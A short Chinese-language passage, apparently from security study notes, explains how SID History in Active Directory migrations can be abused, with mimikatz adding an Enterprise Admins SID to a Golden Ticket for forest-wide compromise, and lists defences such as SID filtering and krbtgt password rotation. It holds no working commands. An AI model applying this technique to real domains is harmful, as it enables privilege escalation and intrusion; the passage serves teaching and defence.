在迁移方案中，从 DomainA 迁移到 DomainB 的用户将原始 DomainA 用户 SID 值添加到新的 DomainB 的 SID History 属性中。当用户使用新帐户登录 DomainB 时，DomainA SID 将与确定访问的 DomainB 用户组一起验证。这意味着可以将 SID 添加到 SID 历史记录以扩展访问。

新版的 mimikatz 可以将历史 SID 记录添加到 Forest Enterprise Admins 组的 Golden Ticket 中。一旦单个域受到攻击，整个域都会受到威胁。

**防御：**

在 Active Directory 林中的信任之间启用 SID 筛选可以防止绕过黄金票据局限性。

#### 黄金票据防御

定期修改 krbtgt 密码

限制管理员账户在其他主机上登录，委派给其他账户相关权限代替管理员账户。